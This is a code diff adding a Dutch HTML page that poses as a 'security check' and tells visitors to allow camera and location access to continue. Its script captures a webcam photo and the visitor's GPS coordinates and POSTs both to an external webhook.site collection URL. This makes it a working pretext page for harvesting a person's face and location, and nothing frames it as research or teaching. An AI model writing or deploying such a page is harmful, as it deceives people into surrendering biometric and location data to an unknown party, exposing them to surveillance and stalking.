@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+  <meta charset="UTF-8">
+  <title>Camera check</title>
+</head>
+<body>
+  <h2>Beveiligingscontrole</h2>
+  <p>Sta camera en locatie toe om door te gaan.</p>
+
+  <video id="video" autoplay playsinline width="300"></video>
+  <br><br>
+  <button onclick="makePhoto()">Maak foto</button>
+
+  <script>
+    let stream;
+
+    // Camera starten
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(s => {
+        stream = s;
+        document.getElementById('video').srcObject = s;
+      })
+      .catch(err => alert("Camera toestemming geweigerd"));
+
+    function makePhoto() {
+      const canvas = document.createElement('canvas');
+      const video = document.getElementById('video');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+
+      canvas.toBlob(blob => {
+        // Locatie ophalen
+        navigator.geolocation.getCurrentPosition(pos => {
+          const data = new FormData();
+          data.append("photo", blob, "photo.jpg");
+          data.append("lat", pos.coords.latitude);
+          data.append("lon", pos.coords.longitude);
+
+          fetch("https://webhook.site/5e01cbe7-69a6-4f2e-b2eb-68ce676642b5", {
+            method: "POST",
+            body: data
+          });
+
+          alert("Foto en locatie verzonden");
+        });
+      });
+    }
+  </script>
+</body>
+</html>
